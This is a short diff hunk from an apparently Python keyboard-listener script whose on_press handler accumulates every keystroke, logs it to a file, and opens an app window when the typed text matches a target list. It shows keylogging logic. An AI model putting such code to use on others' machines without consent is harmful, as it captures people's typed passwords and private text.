@@ -37,7 +37,7 @@ def on_press(key):
     global tracker
     global target
     tracker = tracker + str(key)
-    if tracker == "dog": #in target:
+    if tracker in target:
         logging.info(tracker) #this logs the key typed in the file
         app = SampleApp()
         app.mainloop()
